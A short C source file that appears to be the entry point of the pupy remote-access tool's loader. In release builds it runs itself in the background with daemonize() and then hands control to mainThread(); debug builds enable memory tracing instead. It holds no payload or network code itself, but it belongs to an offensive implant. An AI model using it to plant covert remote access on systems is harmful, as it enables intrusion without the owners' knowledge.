#include <sys/types.h>
#include <unistd.h>

#include "pupy_load.h"
#include "daemonize.h"

#ifdef Linux
#include <mcheck.h>
#endif

int main(int argc, char *argv[], char *env[]) {
#ifndef DEBUG
    daemonize(argc, argv, env, true);
#else
#ifdef Linux
    mtrace();
#endif
#endif
    return mainThread(argc, argv, false);
}
